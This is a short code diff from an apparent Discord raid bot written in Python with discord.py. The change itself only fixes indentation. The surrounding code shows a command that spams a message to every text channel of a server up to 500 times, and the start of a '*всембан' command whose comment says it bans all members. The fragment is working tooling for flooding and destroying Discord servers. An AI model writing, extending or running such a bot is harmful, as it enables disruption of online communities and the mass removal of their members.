@@ -86,7 +86,7 @@ class MyClient(discord.Client):
 				await message.delete()
 				while s <= 500:
             				for channel in message.guild.text_channels:
-                				await channel.send(spam)
+					await channel.send(spam)
 						s = s + 1
 			if message.content == '*всембан': #бан всех участников
 				await message.delete()
